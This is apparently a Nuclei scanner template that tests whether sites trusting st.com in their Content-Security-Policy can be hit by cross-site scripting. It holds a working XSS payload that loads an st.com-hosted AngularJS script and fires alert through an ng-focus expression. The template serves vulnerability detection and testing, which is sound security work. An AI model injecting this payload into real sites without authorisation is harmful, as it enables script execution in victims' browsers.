flow: http(1) && headless(1)
headless:
- fuzzing:
  - fuzz:
    - '{{url_encode(injection)}}'
    mode: single
    part: query
    type: replace
  matchers:
  - dsl:
    - st_angular_csp_xss == true
    type: dsl
  payloads:
    injection:
    - <body ng-app ng-csp><script src="https://www.st.com/etc/clientlibs/st-search-cx/stangularjs.min.d9f5c8180af41b5cae710870b6b018fe.js"></script><input
      autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}'
  - action: waitdialog
    args:
      max-duration: 5s
    name: st_angular_csp_xss
http:
- matchers:
  - condition: and
    internal: true
    part: header
    type: word
    words:
    - Content-Security-Policy
    - st.com
  method: GET
  path:
  - '{{BaseURL}}'
id: st-angular-csp-bypass
info:
  author: renniepak,DhiyaneshDK
  metadata:
    verified: true
  name: Content-Security-Policy Bypass - ST Angular
  reference:
  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  severity: medium
  tags: xss,csp-bypass,st-angular,vuln
